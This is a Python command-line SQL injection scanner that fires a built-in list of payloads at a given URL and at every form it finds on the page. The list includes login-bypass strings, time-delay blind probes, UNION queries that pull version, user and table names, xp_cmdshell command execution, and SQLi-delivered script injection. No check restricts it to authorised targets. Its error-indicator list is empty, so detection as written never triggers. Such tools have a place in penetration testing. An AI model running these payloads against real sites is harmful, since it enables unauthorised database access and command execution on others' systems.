import requests
import argparse
from urllib.parse import urlparse, urljoin
from tqdm import tqdm
try:
    from bs4 import BeautifulSoup
    bs4_present = True
except ImportError:
    bs4_present = False

# Default SQLi payloads
sqli_payloads = [
    "'", 
    "''", 
    "' OR '1'='1", 
    "' OR '1'='1' --", 
    "' OR '1'='1' /*", 
    "' OR 1=1--", 
    "' OR 1=1#", 
    "' OR 1=1/*", 
    "admin' --", 
    "admin' #", 
    "admin'/*", 
    "' OR '1'='1'{", 
    "' OR 1=1--", 
    "' OR 1=1#", 
    "' OR 1=1/*", 
    "admin' --", 
    "admin' #", 
    "admin'/*", 
    "1' WAITFOR DELAY '0:0:5'--", 
    "1'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5) --",
    "' OR SLEEP(5) = '",
    "'; EXEC xp_cmdshell('whoami') --",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1, @@version --",
    "'; EXEC xp_cmdshell('calc.exe') --",
    "' OR EXISTS(SELECT * FROM users) --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 114 --",
    "' AND 1=(SELECT COUNT(*) FROM tablenames); --",
    "'; WAITFOR DELAY '0:0:10' --",
    "' OR 'x'='x' AND 1=(SELECT 1 FROM dual WHERE database() LIKE '%') --",
    "' OR 'x'='x' AND version() LIKE '% --",
    "' OR 'x'='x' AND MID(version(), 1, 1) = '5' --",
    "' AND 'x'='y' AND (SELECT LENGTH(version())) > 0 --",
    "' AND 1=2 UNION SELECT 1, version(), database() --",
    "' AND 1=2 UNION SELECT 1, user(), database() --",
    "1' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(database() AS NCHAR),0x20)),1,1))>64) THEN 0x31 ELSE 0x30 END)) AND '1'='1",
    "' AND 1=2 UNION SELECT ALL 1,2,3,4,5,6,name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')--",
    "' AND 1=2 UNION SELECT ALL 1,2,3,4,5,6,7 FROM sysobjects WHERE xtype = 'U' --",  # Lists all user tables
    "1' AND 1=0 UNION ALL SELECT 1,NULL,'<script>alert(XSS)</script>',table_name FROM INFORMATION_SCHEMA.TABLES WHERE 2>1--",  # XSS through SQLi
    "1' AND 1=0 UNION ALL SELECT 1,NULL,'<script>alert(XSS)</script>',column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE 2>1--",  # XSS through SQLi
    # Add more payloads as needed
]

# Default error indicators
default_error_indicators = [
    # Your list of error indicators as previously defined...
]

def test_url(url, payloads, error_indicators, method='GET', data=None, timeout=10, verbosity=0):
    vulnerable = False
    for payload in tqdm(payloads, desc="Testing payloads", unit="payload"):
        if method == 'GET':
            test_url = f"{url}{payload}"
            try:
                response = requests.get(test_url, timeout=timeout)
            except requests.RequestException as e:
                if verbosity > 0:
                    print(f"Request failed: {e}")
                continue
        else:  # POST
            modified_data = {key: payload for key in data}
            try:
                response = requests.post(url, data=modified_data, timeout=timeout)
            except requests.RequestException as e:
                if verbosity > 0:
                    print(f"Request failed: {e}")
                continue

        if verbosity > 1:
            print(f"Testing with payload: {payload}")

        for indicator in error_indicators:
            if indicator in response.text.lower():
                print(f"[!] Vulnerable {method} parameter detected at: {url}")
                print(f"    Payload: {payload}")
                vulnerable = True
                break
        if vulnerable:
            break

def test_forms(url, payloads, error_indicators, timeout, verbosity):
    if not bs4_present:
        print("bs4 (BeautifulSoup) not installed. Skipping form tests.")
        return
    response = requests.get(url, timeout=timeout)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    for form in tqdm(forms, desc="Testing forms", unit="form"):
        action = form.get('action')
        method = form.get('method', 'get').upper()
        action_url = urljoin(url, action)
        inputs = form.find_all('input')
        form_data = {input.get('name'): "test" for input in inputs if input.get('type') != 'submit'}
        test_url(action_url, payloads, error_indicators, method=method, data=form_data, timeout=timeout, verbosity=verbosity)

def main():
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    parser.add_argument("url", help="The URL to scan for SQL Injection vulnerabilities")
    parser.add_argument("--payloads", help="File containing custom SQLi payloads (one per line)", type=str)
    parser.add_argument("--timeout", help="Request timeout in seconds", type=int, default=10)
    parser.add_argument("--verbosity", help="Increase output verbosity (0 = minimal, 1 = detailed, 2 = debug)", type=int, choices=[0, 1, 2], default=0)
    args = parser.parse_args()

    # Load custom payloads if provided, else use default payloads
    if args.payloads:
        try:
            with open(args.payloads, 'r') as file:
                payloads = [line.strip() for line in file.readlines()]
        except IOError:
            print("Failed to read payloads file, using default payloads.")
            payloads = sqli_payloads
    else:
        payloads = sqli_payloads

    # Use default error indicators
    error_indicators = default_error_indicators

    print(f"Scanning {args.url} for SQL Injection vulnerabilities with verbosity level {args.verbosity}...")
    # Test the provided URL with query parameters
    test_url(args.url, payloads, error_indicators, timeout=args.timeout, verbosity=args.verbosity)

    # Test forms for POST-based SQLi
    test_forms(args.url, payloads, error_indicators, timeout=args.timeout, verbosity=args.verbosity)

if __name__ == "__main__":
    main()
